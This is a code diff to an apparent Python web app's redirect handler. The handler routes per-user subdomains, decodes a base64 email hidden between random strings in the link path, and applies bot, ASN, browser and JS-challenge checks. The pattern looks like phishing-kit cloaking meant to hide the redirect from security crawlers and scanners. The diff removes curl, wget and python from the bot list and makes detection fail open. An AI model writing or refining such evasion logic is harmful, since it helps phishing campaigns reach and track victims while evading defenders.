@@ -68,8 +68,8 @@ except Exception as e:
 
 # Bot detection
 BOT_PATTERNS = [
-    "bot", "crawl", "spider", "slurp", "curl", "wget", "python", "scrapy",
-    "facebookexternalhit", "googlebot", "bingbot", "yandex", "duckduckbot"
+    "bot", "crawl", "spider", "slurp", "facebookexternalhit", "googlebot",
+    "bingbot", "yandex", "duckduckbot"
 ]
 
 def is_bot(user_agent):
@@ -83,7 +83,7 @@ def is_bot(user_agent):
         return result
     except Exception as e:
         logger.error(f"Error in is_bot: {str(e)}", exc_info=True)
-        return True
+        return False  # Allow non-browser clients for testing
 
 def check_asn(ip):
     try:
@@ -515,7 +515,17 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
         ip = request.remote_addr
         logger.debug(f"Redirect handler for {username}.{BASE_DOMAIN}/{endpoint}, IP: {ip}, User-Agent: {user_agent}, Path Segment: {path_segment}")
 
-        if is_bot(user_agent) or check_asn(ip) or not verify_browser():
+        # Anti-bot checks with detailed logging
+        if is_bot(user_agent):
+            logger.warning(f"Bot detected: User-Agent={user_agent}")
+        if check_asn(ip):
+            logger.warning(f"Suspicious ASN detected for IP={ip}")
+        if not verify_browser():
+            logger.warning("Browser verification failed")
+        if not session.get('js_verified'):
+            logger.warning("JS challenge not completed")
+
+        if is_bot(user_agent) or check_asn(ip) or not verify_browser() or not session.get('js_verified'):
             logger.warning("Bot or unverified browser detected")
             challenge = secrets.token_hex(16)
             if redis_client:
@@ -564,7 +574,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                 </html>
             """, challenge=challenge)
 
-        # Flexible path_segment parsing (no strict email validation)
+        # Flexible path_segment parsing (no strict validation)
         randomstring1_short = path_segment[:6] if len(path_segment) >= 6 else "xxxxxx"
         randomstring2_short = path_segment[-8:] if len(path_segment) >= 8 else "xxxxxxxx"
         base64_email = path_segment[6:-8] if len(path_segment) > 14 else "default"
